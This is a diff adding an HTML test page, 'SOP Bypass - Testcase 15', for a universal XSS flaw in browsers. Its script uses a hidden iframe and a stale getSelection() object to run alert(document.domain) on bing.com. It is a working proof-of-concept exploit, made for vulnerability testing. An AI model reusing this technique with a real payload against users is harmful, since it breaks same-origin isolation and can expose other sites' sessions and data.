@@ -1,0 +1,105 @@
+<html>
+	<head>
+		<title>Universal XSS (UXSS) SOP Bypass Vulnerability test</title>
+		<style type="text/css">
+			*{margin:0;padding:0;}
+			.wrapper {
+				width: 95%;
+				background-color: #16a085;
+				margin: 0 auto;
+				font-family: times new roman;
+				height: 88%;
+			}
+			.line {
+				background-color: #ecf0f1;
+				text-align: center;
+				padding: 10px;
+				color: #16a085;;
+			}
+			.main {
+				color: #fff;
+				padding: 10px;
+			}
+			.test {
+				width: 200px;
+				height: 40px;
+				background-color: #fff;
+				border: none;
+				border-radius: 100px;	
+				color: #16a085;
+				font-size: 1.6em;
+				margin: 0 auto;
+			}
+			.note {
+				background: #1abc9c;
+				color: #fff;
+				padding: 10px;
+				width: 95%;
+				margin: 0 auto;
+				margin-top: 40px;
+			}
+		</style>
+	</head>
+<body>
+
+
+	<div class="wrapper">
+			<img src="and.png">
+	
+			<h3 class="line">SOP Bypass - Testcase 15</h3>	
+
+		<div class="main">
+				<p></p>
+		</div>
+<script> 
+
+
+function myfunction()
+{
+
+frame = document.body.appendChild(document.createElement("iframe"));
+frame.width="0px";
+frame.height="0px";
+    wnd = frame.contentWindow;
+    func = wnd.Function;
+
+    wnd.location = "about:blank";
+    frame.onload = function() {
+        selection = func("return getSelection()")();
+
+        wnd.location = "http://www.bing.com";
+        frame.onload = function() {
+            frame.onload = null;
+
+            selection.baseNode.constructor.constructor.constructor("alert(document.domain)")()
+        }
+    }
+
+	  
+	  
+	  }
+
+ 
+ 
+</script>
+		
+		<center>	<input type="button" id="btn_test" class="test" value="Run Test Case" onclick="myfunction()" /></center>
+
+		
+
+
+ 
+ 
+
+		</br></br>
+			<div class="note">
+		
+				<p><strong>Note:</strong> <br />
+					If page displays an alert box displaying bing.com, your browser is vulnerable to SOP bypass "
+				</p>
+			</div>
+	</div>
+
+
+</body>
+</html>
